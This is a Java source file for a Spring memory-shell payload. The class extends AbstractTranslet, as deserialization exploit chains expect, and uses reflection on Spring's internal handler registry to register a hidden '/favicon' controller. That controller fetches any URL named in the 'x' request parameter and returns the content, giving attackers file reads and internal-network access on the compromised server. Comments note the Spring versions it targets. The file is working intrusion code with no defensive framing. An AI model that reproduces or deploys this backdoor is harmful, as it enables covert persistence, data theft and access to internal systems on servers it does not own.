import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.util.pattern.PathPatternParser;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.util.Map;

@RestController
public class MemController11 extends AbstractTranslet {
    public MemController11() throws Exception {
        final String controllerPath = "/favicon";
        WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
        RequestMappingHandlerMapping r = context.getBean(RequestMappingHandlerMapping.class);
        Method method = MemController11.class.getDeclaredMethod("execX");
        Field mapfield = AbstractHandlerMethodMapping.class.getDeclaredField("mappingRegistry");
        mapfield.setAccessible(true);
        Object mr = mapfield.get(r);
        Class<?> mrclazz = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry");
        Method mrms = mrclazz.getDeclaredMethod("register", Object.class, Object.class, Method.class);
        Field lookupfield = null;
        try {
            lookupfield = mrclazz.getDeclaredField("urlLookup");
            lookupfield.setAccessible(true);
        }catch (NoSuchFieldException e){
            lookupfield = mrclazz.getDeclaredField("pathLookup");
            lookupfield.setAccessible(true);
        }
        Map<String, Object> urlLookup = (Map<String, Object>) lookupfield.get(mr);
        for (String urlPath : urlLookup.keySet()) {
            if (controllerPath.equals(urlPath)) {
                throw new Exception("controller url path exist already");
            }
        }
        // 2.4.6写法
//        PatternsRequestCondition url = new PatternsRequestCondition(controllerPath);
//        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
//        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);
        // 2.6.6写法
        RequestMappingInfo.BuilderConfiguration option = new RequestMappingInfo.BuilderConfiguration();
        option.setPatternParser(new PathPatternParser());
        RequestMappingInfo info = RequestMappingInfo.paths(controllerPath).options(option).build();
        mrms.setAccessible(true);
        // 免进入实例创建的死循环
        MemController11 mem = new MemController11("aaa");
        mrms.invoke(mr, info, mem, method);
//        r.registerMapping(info, new MemController11("aaa"), method);
    }

    public MemController11(String aaa){}

    public void execX() {
        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();
        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();
        try {
            String arg0 = request.getParameter("x");
            PrintWriter writer = response.getWriter();
            if (arg0 != null) {
                String urlContent = "";
                final URL url = new URL(arg0);
                final BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
                String inputLine = "";
                while ((inputLine = in.readLine()) != null) {
                    urlContent = urlContent + inputLine + "\n";
                }
                in.close();
                writer.println(urlContent);
            } else {
                response.sendError(404);
            }
        } catch (Exception var8) {
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
